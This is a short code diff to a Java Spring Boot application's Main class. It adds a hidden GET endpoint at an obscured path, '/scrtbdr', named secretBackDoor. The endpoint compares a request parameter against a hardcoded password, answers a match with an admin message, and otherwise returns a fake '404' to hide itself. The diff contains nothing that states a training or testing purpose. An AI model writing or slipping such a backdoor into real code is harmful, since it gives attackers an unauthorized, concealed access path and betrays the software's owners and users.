@@ -22,6 +22,15 @@ public class Main {
 		return InfoPage.showInfo( email );		
 	}	
 	
+	@GetMapping( value= "/scrtbdr" )
+	@ResponseBody 
+	public String secretBackDoor(@RequestParam(required=true) String password ) {
+		if ( password.equals( "dGVzdA==") ) {
+			return "You're an admin now!!";
+		}
+		return "404";
+	}
+	
     public static void main(String[] args) {
         SpringApplication.run(Main.class, args);
     }
